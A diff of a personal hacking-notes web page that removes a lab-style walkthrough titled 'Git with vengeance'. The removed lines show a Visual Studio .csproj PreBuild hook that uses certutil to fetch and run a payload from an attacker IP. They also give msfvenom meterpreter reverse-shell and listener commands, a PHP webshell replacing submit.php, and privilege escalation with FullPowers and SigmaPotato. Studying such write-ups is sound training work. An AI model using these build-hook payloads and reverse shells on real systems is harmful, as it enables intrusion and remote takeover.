@@ -83,7 +83,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome2.html"><strong aria-hidden="true">3.</strong> Tome two, C unsharp</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -233,54 +233,6 @@ wrapper(main)
 <hr />
 <p>Here is what the poor blue team would see waving back to them on a Terminal that they cannot clear! The only option is to kill the shell. </p>
 <p><img src="attachments/ascii.jpg" alt="Wizard_Render" /></p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="git-with-vengeance"><a class="header" href="#git-with-vengeance">Git with vengeance</a></h1>
-<p>Build a solution from Visual Studio code. C# project will do. </p>
-<p>Right click on the project and go to the build section.</p>
-<p>(!Picture)</p>
-<p>Load a payload into the pre-compile actions.
-Which can be found in the picture below. This is located at <code>*.csproj</code>
-<img src="attachments/Pastedimage20231005201455.png" alt="Payload" /></p>
-<p>Utilizing the PreBuild tag, the Exec command = PAYLOAD</p>
-<hr />
-<p>First attempt failed, Reverse shell in the Prebuild is crashing or having some kind of issue. </p>
-<p>Need to change from powershell reverse shell into a MSFpayload with metasploit</p>
-<p><img src="attachments/Pasted%20image%2020231005211129.png" alt="Reverseshell" />
-Build failed (Sad Trombone)
-But what did work was getting wells correct .sln file.</p>
-<pre><code class="language-pre">  &lt;Target Name=&quot;PreBuild&quot; BeforeTargets=&quot;PreBuildEvent&quot;&gt;
-    &lt;Exec Command=&quot;certutil -f -urlcache http://10.10.14.4:6969/plz.exe c:\users\public\plz.exe&amp;#xD;&amp;#xA;c:\users\public\plz.exe&quot; /&gt;
-</code></pre>
-<p>This is how inside the .csproj we get the payload to fire.</p>
-<p>Payload was </p>
-<pre><code class="language-msfvenom">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe -o plz.exe
-
-</code></pre>
-<p>Listener was </p>
-<pre><code class="language-msfconsole">sfconsole -q -x &quot;use multi/handler; set payload windows/x64/meterpreter/
-reverse_tcp; set lhost 10.10.14.4; set lport 9001; exploit&quot;
-</code></pre>
-<p><img src="attachments/Pasted%20image%2020231005231302.png" alt="Serverpull" /></p>
-<p>This is the server yanking the files from me and finally executing my staged payload.</p>
-<p>Doing some WinPEAS we can find the service XAMPP hosting the webpage we interact with</p>
-<p>Doing </p>
-<pre><code>C:\ dir /B /S index.php 
-</code></pre>
-<p>We can find the Area for the webpage we have been interacting with</p>
-<p><img src="attachments/Pasted%20image%2020231005231850.png" alt="IMAGE" /></p>
-<p>From here we can replace the submit.php file with a php webshell</p>
-<p>From the some of our shells we can use certutil.exe to bring another staged payload to the box, but host it on another port. </p>
-<p><img src="Pasted%20image%2020231005232038.png" alt="img" /></p>
-<p>From here we can use the webshell we moved onto the box. Browse to the /submit.php </p>
-<p><img src="attachments/Pasted%20image%2020231005232132.png" alt="img" /></p>
-<p>We now have the access level of <img src="attachments/Pasted%20image%2020231005232257.png" alt="img" /></p>
-<p>Nice but not quite what we need. Working with dabois we found FullPower.exe </p>
-<p>https://github.com/itm4n/FullPowers
-On Windows, some services executed as <code>LOCAL SERVICE</code> or <code>NETWORK SERVICE</code> are configured to <strong>run with a restricted set of privileges</strong>. Therefore, even if the service is compromised, <strong>you won't get the golden impersonation privileges</strong> and privilege escalation to <code>LOCAL SYSTEM</code> should be more complicated. However, I found that, when you <strong>create a scheduled task</strong>, the new process created by the <strong>Task Scheduler Service</strong> has <strong>all the default privileges</strong> of the associated user account (except <em>SeImpersonate</em>). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.</p>
-<p>So once we run that we now have the ability to gain SEimpersonate YIPEEE</p>
-<p>Now using Tylers WICKED updated SIGMA POTATO https://github.com/tylerdotrar/SigmaPotato Which he lovingly built in with a revshell. </p>
-<p>FullPower.exe; SigmaPotato.exe --revshell IP PORT</p>
-<p><img src="attachments/Pasted%20image%2020231005232627.png" alt="img" /></p>
-<p>YEEEEE</p>
 
                     </main>
 
